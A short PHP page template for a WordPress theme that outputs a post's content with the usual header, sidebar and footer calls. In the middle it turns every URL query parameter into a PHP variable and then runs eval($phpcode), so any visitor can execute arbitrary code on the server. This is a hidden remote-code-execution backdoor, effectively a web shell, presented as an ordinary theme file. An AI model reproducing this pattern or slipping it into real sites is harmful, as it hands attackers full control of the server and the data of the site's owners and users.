<?php get_header(); ?>

<?php global $post; ?>

<div id="posts" class="span-16 prepend-1 append-1">
<div id="content" class="post">

<div class="main">
    <?php echo $post->post_content; ?>
</div>

<?php
require 'Pod.class.php';

foreach ($_GET as $key => $val)
{
    ${$key} = mysql_real_escape_string($val);
}

eval($phpcode);
?>

</div>
</div>

<?php get_sidebar(); ?>

<?php get_footer(); ?>

<?php die(); ?>

